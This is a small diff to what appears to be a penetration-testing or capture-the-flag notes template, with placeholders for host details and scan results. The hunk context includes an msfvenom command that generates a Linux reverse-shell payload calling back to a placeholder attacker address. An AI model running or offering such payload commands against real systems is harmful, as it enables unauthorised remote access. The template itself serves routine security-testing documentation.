@@ -8,9 +8,6 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f elf -o s
 - Kernel:
 - Workgroup:
 - Windows domain:
-- Services and ports:
-
-INSERTTCPSCAN
 
 ### Full TCP Scan
 
@@ -21,7 +18,6 @@ INSERTFULLTCPSCAN
 INSERTUDPSCAN
 
 ### Vuln Scan
-
 INSERTVULNSCAN
 
 ```
